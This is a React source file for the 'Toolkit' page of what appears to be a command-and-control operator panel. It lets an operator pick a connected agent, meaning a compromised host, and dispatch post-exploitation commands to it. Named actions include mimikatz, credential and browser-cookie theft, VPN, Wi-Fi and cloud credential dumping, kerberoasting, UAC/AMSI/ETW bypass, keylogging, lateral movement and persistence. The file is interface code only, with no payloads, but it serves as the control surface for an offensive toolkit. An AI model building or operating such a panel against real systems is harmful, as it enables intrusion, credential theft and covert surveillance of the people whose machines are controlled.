"use client";

import { useEffect, useState } from "react";
import { StatusBadge } from "@/components/ui/status-indicator";
import { PageContainer } from "@/components/ui/page-container";
import { CardHeaderRow } from "@/components/ui/card-header-row";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { useI18n } from "@/lib/i18n";
import { useApiResource } from "@/lib/hooks/useApiResource";
import { toast } from "sonner";
import { Skeleton } from "@/components/ui/skeleton";

interface ToolkitAgent {
  id?: string;
  hostname?: string;
  ip?: string;
  os?: string;
}

interface RecentTask {
  ID?: string;
  id?: string;
  AgentID?: string;
  agent_id?: string;
  Type?: string;
  type?: string;
  Command?: string;
  command?: string;
  Status?: string;
  status?: string;
  CreatedAt?: string;
  created_at?: string;
}

export default function ToolkitPage() {
  const { t } = useI18n();
  const [selectedAgent, setSelectedAgent] = useState("");
  const [agentInfo, setAgentInfo] = useState<Record<string, unknown> | null>(null);
  const runAction = async (action: string, param = "") => {
    if (!selectedAgent) {
      toast.error(t("toolkit.toast.select_agent_first"));
      return;
    }
    try {
      const data = await api.post(paths.toolkit.action(selectedAgent), { action, param });
      if (data.success) {
        toast.success(t("toolkit.toast.action_dispatched", { action: action, task_id: String(data.task_id) }));
        loadData();
      } else {
        toast.error((data.error as string) || t("toolkit.toast.action_failed"));
      }
    } catch (e) {
      toast.error(String(e));
    }
  };

  const loadData = () => {
    void refresh();
  };

  const { data, loading, refresh } = useApiResource<{ toolkitAgents: ToolkitAgent[]; recentTasks: RecentTask[] }>({
    fetcher: async () => {
      const [agentsData, tasksData] = await Promise.all([
        api.get(paths.agents.list()),
        api.get(paths.toolkit.results),
      ]);
      return {
        toolkitAgents: (agentsData.agents || (Array.isArray(agentsData) ? agentsData : [])) as ToolkitAgent[],
        recentTasks: (tasksData.tasks || tasksData.results || tasksData.data || []) as RecentTask[],
      };
    },
    toastThrottleMs: 0,
    errorMessage: t("toolkit.toast.load_failed"),
  });
  const toolkitAgents = data?.toolkitAgents ?? [];
  const recentTasks = data?.recentTasks ?? [];

  useEffect(() => {
    if (!selectedAgent) { setAgentInfo(null); return; }
    api.get<{ agent?: Record<string, unknown> }>(`/toolkit/agents/${selectedAgent}/info`)
      .then((d) => setAgentInfo(d.agent || null))
      .catch(() => setAgentInfo(null));
  }, [selectedAgent]);

  const quickActions = [
    { label: "whoami", value: "whoami" },
    { label: "hostname", value: "hostname" },
    { label: "ipconfig", value: "ipconfig" },
    { label: "systeminfo", value: "systeminfo" },
    { label: "ps", value: "ps" },
    { label: "screenshot", value: "screenshot" },
    { label: "beacon_now", value: "beacon_now" },
    { label: "mimikatz", value: "mimikatz" },
    { label: "creds", value: "creds" },
    { label: "elevate", value: "elevate" },
  ];

  const categories = [
    { name: t("toolkit.cat_system_recon"), color: "cyan", commands: [
      { cmd: "whoami", desc: t("toolkit.desc_whoami") },
      { cmd: "hostname", desc: t("toolkit.desc_hostname") },
      { cmd: "ipconfig", desc: t("toolkit.desc_ipconfig") },
      { cmd: "systeminfo", desc: t("toolkit.desc_systeminfo") },
      { cmd: "env", desc: t("toolkit.desc_env") },
      { cmd: "uptime", desc: t("toolkit.desc_uptime") },
    ]},
    { name: t("toolkit.cat_process_service"), color: "emerald", commands: [
      { cmd: "ps", desc: t("toolkit.desc_ps") },
      { cmd: "tasklist", desc: t("toolkit.desc_tasklist") },
      { cmd: "services", desc: t("toolkit.desc_services") },
      { cmd: "schtasks", desc: t("toolkit.desc_schtasks") },
      { cmd: "drivers", desc: t("toolkit.desc_drivers") },
    ]},
    { name: t("toolkit.cat_network_recon"), color: "blue", commands: [
      { cmd: "netstat", desc: t("toolkit.desc_netstat") },
      { cmd: "netstat -an", desc: t("toolkit.desc_netstat_all") },
      { cmd: "arp -a", desc: t("toolkit.desc_arp") },
      { cmd: "route print", desc: t("toolkit.desc_route") },
      { cmd: "net user", desc: t("toolkit.desc_net_user") },
      { cmd: "net localgroup", desc: t("toolkit.desc_net_localgroup") },
      { cmd: "av", desc: t("toolkit.desc_av") },
    ]},
    { name: t("toolkit.cat_credential_access"), color: "rose", commands: [
      { cmd: "mimikatz", desc: t("toolkit.desc_mimikatz") },
      { cmd: "creds_dump", desc: t("toolkit.desc_creds_dump") },
      { cmd: "browser_steal", desc: t("toolkit.desc_browser_steal") },
      { cmd: "cookie_export", desc: t("toolkit.desc_cookie_export") },
      { cmd: "vpn_creds", desc: t("toolkit.desc_vpn_creds") },
      { cmd: "wifi_creds", desc: t("toolkit.desc_wifi_creds") },
      { cmd: "kerberoast", desc: t("toolkit.desc_kerberoast") },
      { cmd: "cloud_steal", desc: t("toolkit.desc_cloud_steal") },
    ]},
    { name: t("toolkit.cat_privesc_bypass"), color: "amber", commands: [
      { cmd: "privesc_check", desc: t("toolkit.desc_privesc_check") },
      { cmd: "elevate", desc: t("toolkit.desc_elevate") },
      { cmd: "uac_bypass", desc: t("toolkit.desc_uac_bypass") },
      { cmd: "amsi_bypass", desc: t("toolkit.desc_amsi_bypass") },
      { cmd: "etw_bypass", desc: t("toolkit.desc_etw_bypass") },
    ]},
    { name: t("toolkit.cat_screen_monitor"), color: "purple", commands: [
      { cmd: "screenshot", desc: t("toolkit.desc_screenshot") },
      { cmd: "keylogger_start", desc: t("toolkit.desc_keylogger_start") },
      { cmd: "keylogger_stop", desc: t("toolkit.desc_keylogger_stop") },
      { cmd: "keylogger_dump", desc: t("toolkit.desc_keylogger_dump") },
      { cmd: "clipboard_get", desc: t("toolkit.desc_clipboard_get") },
    ]},
    { name: t("toolkit.cat_lateral_persist"), color: "teal", commands: [
      { cmd: "lateral", desc: t("toolkit.desc_lateral") },
      { cmd: "persistence", desc: t("toolkit.desc_persistence") },
    ]},
  ];

  const colorMap: Record<string, string> = {
    cyan: "bg-chart-2/10 text-chart-2 border-chart-2/30",
    emerald: "bg-success/10 text-chart-1 border-success/30",
    blue: "bg-info/10 text-info border-info/30",
    rose: "bg-chart-5/10 text-chart-5 border-chart-5/30",
    amber: "bg-warning/10 text-warning border-warning/30",
    purple: "bg-chart-6/purple text-chart-6 border-chart-6/purple",
    teal: "bg-chart-2/10 text-chart-2 border-chart-2/30",
  };

  return (
    <PageContainer title={t("toolkit.title")} subtitle={t("toolkit.subtitle")} actions={<>
        <div className="flex items-center gap-2">
          <span className="text-sm text-muted-foreground">{t("toolkit.target_agent")}</span>
          <Select value={selectedAgent} onValueChange={v => setSelectedAgent(v ?? "")}>
            <SelectTrigger className="w-full"><SelectValue placeholder={t("toolkit.select_agent_placeholder")} /></SelectTrigger>
            <SelectContent>
              <SelectItem value="">{t("toolkit.select_agent_placeholder")}</SelectItem>
              {toolkitAgents.map((a) => (
                <SelectItem key={a.id} value={a.id || ""}>
                  {(a.hostname || "unknown")} ({a.ip || "-"})
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
      </>}>

      <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
        <div className="xl:col-span-3 space-y-4">
          <Card className="p-4">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-warning text-sm font-bold">!</span>
              <span className="text-xs font-semibold text-muted-foreground">{t("toolkit.quick_actions")}</span>
            </div>
            <div className="flex flex-wrap gap-2">
              {quickActions.map((qa) => (
                <Button key={qa.value} variant="outline" size="sm" onClick={() => runAction(qa.value)} className="rounded-lg text-xs hover:border-primary/30 hover:text-primary transition-all">
                  {qa.label}
                </Button>
              ))}
            </div>
          </Card>

          {loading ? (
            <div className="space-y-4">
              {[1,2,3].map(i => <Skeleton key={i} className="h-32 rounded-lg" />)}
            </div>
          ) : (
            categories.map((cat) => (
              <Card key={cat.name} className="overflow-hidden">
                <div className="flex items-center justify-between px-5 py-3.5 cursor-pointer hover:bg-muted transition-colors">
                  <div className="flex items-center gap-3">
                    <div className={`w-8 h-8 rounded-lg flex items-center justify-center border ${colorMap[cat.color]}`}>
                      <span className="text-xs font-bold">{cat.name[0]}</span>
                    </div>
                    <span className="font-semibold text-sm text-foreground">{cat.name}</span>
                    <Badge variant="secondary" className="text-(--fs-micro-sm) px-2 py-0.5">{cat.commands.length}</Badge>
                  </div>
                </div>
                <div className="px-5 pb-4 space-y-1">
                  {cat.commands.map((c) => (
                    <Button key={c.cmd} variant="ghost" onClick={() => runAction(c.cmd)} className="w-full flex items-center gap-3 px-3 py-2 rounded-lg justify-start text-left border border-transparent hover:border-border transition-all">
                      <span className={`text-xs font-mono font-medium w-28 shrink-0 ${colorMap[cat.color]?.split(" ")[1] || "text-info"}`}>{c.cmd}</span>
                      <span className="text-xs text-muted-foreground">{c.desc}</span>
                      <span className="ml-auto text-(--fs-micro-sm) text-muted-foreground">{t("toolkit.run")}</span>
                    </Button>
                  ))}
                </div>
              </Card>
            ))
          )}
        </div>

        <div className="space-y-4">
          {agentInfo && (
            <Card className="p-4 text-xs space-y-1">
              <div className="font-semibold text-muted-foreground mb-2">{t("toolkit.agent_info")}</div>
              <div>Host: {String(agentInfo.hostname || "-")}</div>
              <div>IP: {String(agentInfo.ip || "-")}</div>
              <div>Integrity: {String(agentInfo.integrity || "-")}</div>
              <div>Interval: {String(agentInfo.current_interval ?? "-")}s</div>
            </Card>
          )}
          <Card className="overflow-hidden">
            <CardHeaderRow accent={false} title={t("toolkit.recent_results")} action={<Badge variant="secondary" className="text-(--fs-micro-sm) px-1.5 py-0.5">{recentTasks.length}</Badge>} />
            <div className="max-h-[600px] overflow-y-auto">
              {recentTasks.length === 0 ? (
                <div className="p-4 sm:p-5 text-center text-muted-foreground text-xs">{t("toolkit.no_results")}</div>
              ) : (
                recentTasks.map((t, i) => (
                  <div key={i} className="px-4 py-3 border-b border-border last:border-0 hover:bg-muted transition-colors">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-(--fs-micro-sm) font-mono text-muted-foreground">{(t.agent_id || "").toString().slice(0, 8)}</span>
                      <StatusBadge status={t.status || ""} />
                    </div>
                    <div className="text-xs font-medium text-muted-foreground truncate">{t.type}: {t.command}</div>
                  </div>
                ))
              )}
            </div>
          </Card>
        </div>
      </div>
    </PageContainer>
  );
}


